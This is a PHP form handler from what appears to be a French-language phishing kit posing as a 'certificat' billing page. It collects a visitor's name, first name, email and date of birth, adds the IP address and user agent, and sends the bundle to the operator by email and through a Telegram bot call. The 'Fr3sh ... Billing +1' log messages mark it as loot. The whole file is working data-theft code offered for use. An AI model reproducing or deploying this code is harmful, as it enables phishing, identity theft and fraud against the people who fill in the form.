<?php

include('../common/sub_includes.php');
include('../common/includes.php');
include('../config.php');

ob_start();
if(!isset($_SESSION)){
    session_start();  // Et on ouvre la session
} 

$nom = $_POST['nom'];
$prenom = $_POST['prenom'];
$email = $_POST['email'];
$ddn = $_POST['ddn'];

if($_SERVER['REQUEST_METHOD'] == 'POST'){

  $_SESSION['nom']  = $nom;
  $_SESSION['prenom']  = $prenom;
  $_SESSION['email']  = $email;
  $_SESSION['ddn']  = $ddn;

$message = '
[🦊] Certificat Querty billing +1 [🦊]

👮 Nom : '.$_SESSION['nom'].'
👮‍♀️ Prénom : '.$_SESSION['prenom'].'
💌 Email : '.$_SESSION['email'].'
🎂 Date de naissance : '.$_SESSION['ddn'].'

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

    if($mail_send == true){
    $Subject=' 「🍓」+1 Fr3sh Certificat Billing from '.$_SESSION['nom'].' | '.$_SERVER['HTTP_USER_AGENT'];
    $head='From: Certificat <info@querty.bg>';

    mail($my_mail,$Subject,$message,$head,$heads);
    }

    if($tlg_send == true){
        file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$rez_login.'&text='.urlencode("$message").'');
    }
}
